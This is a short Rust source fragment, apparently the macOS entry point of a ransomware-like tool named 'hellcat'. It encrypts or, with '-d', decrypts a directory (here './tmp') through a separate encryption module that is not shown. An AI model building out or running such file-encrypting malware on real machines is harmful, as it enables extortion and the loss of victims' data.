// import encyrption module in ./encryption/enc.rs
use crate::encryption::enc::{self};

pub async fn hellcat_macos() {
    // get the home directory
    let home = "./tmp";

    println!("Home {}", home);

    // get the args
    let mut decrypt:bool = false;

    // check if argument is present
    for argument in std::env::args() {
        if argument == "-d" {
            decrypt = true;
        }
    }

    // start encryption
    enc::encryption(home, decrypt);
}